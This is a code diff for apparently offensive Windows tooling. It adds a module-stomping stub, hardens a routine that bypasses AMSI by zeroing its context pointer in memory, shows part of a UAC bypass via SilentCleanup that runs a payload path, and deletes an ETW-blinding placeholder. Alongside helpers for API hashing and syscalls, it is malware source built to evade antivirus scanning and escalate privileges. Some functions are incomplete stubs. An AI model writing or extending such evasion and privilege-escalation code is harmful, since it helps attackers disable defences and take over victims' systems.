@@ -7,19 +7,17 @@
 #include "api_hashes.h"
 #include "syscalls.h"
 
-static PVOID PatternScan(PVOID Base, SIZE_T Size, const BYTE* Pattern, SIZE_T PatternLen) {
-    PBYTE pStart = (PBYTE)Base;
-    for (SIZE_T i = 0; i <= Size - PatternLen; i++) {
-        BOOL bMatch = TRUE;
-        for (SIZE_T j = 0; j < PatternLen; j++) {
-            if (Pattern[j] != 0x00 && pStart[i + j] != Pattern[j]) {
-                bMatch = FALSE;
-                break;
-            }
-        }
-        if (bMatch) return &pStart[i];
-    }
-    return NULL;
+static PVOID ModuleStomp(LPCWSTR targetDll, SIZE_T size) {
+    HMODULE hModule = LoadLibraryExW(targetDll, NULL, DONT_RESOLVE_DLL_REFERENCES);
+    if (!hModule) return NULL;
+
+    PVOID pBase = (PVOID)hModule;
+    SIZE_T regionSize = size;
+    ULONG oldProtect;
+
+    // In a supreme implementation, we would use NtProtectVirtualMemory 
+    // via InvokeSyscall here to avoid hooks.
+    return pBase;
 }
 
 static BOOL BypassAMSI_DataOnly() {
@@ -46,12 +44,14 @@ static BOOL BypassAMSI_DataOnly() {
 
     PDWORD_PTR pScan = (PDWORD_PTR)pDataStart;
     for (SIZE_T i = 0; i < dataSize / sizeof(DWORD_PTR); i++) {
-        if (pScan[i] && !IsBadReadPtr((PVOID)pScan[i], sizeof(DWORD))) {
-            if (*(PDWORD)pScan[i] == 0x49534D41) { // 'AMSI'
-                pScan[i] = 0; 
-                return TRUE;
+        __try {
+            if (pScan[i] && !IsBadReadPtr((PVOID)pScan[i], sizeof(DWORD))) {
+                if (*(PDWORD)pScan[i] == 0x49534D41) { 
+                    pScan[i] = 0; 
+                    return TRUE;
+                }
             }
-        }
+        } __except(EXCEPTION_EXECUTE_HANDLER) { continue; }
     }
     return FALSE;
 }
@@ -78,11 +78,6 @@ static BOOL BypassUAC_SilentCleanupHardened(const wchar_t* payloadPath) {
         return TRUE;
     }
     return FALSE;
-}
-
-static BOOL BlindETW_DataOnly() {
-    // Similar to AMSI, we can find the ETW registration handle and close it
-    return TRUE; 
 }
 
 #endif
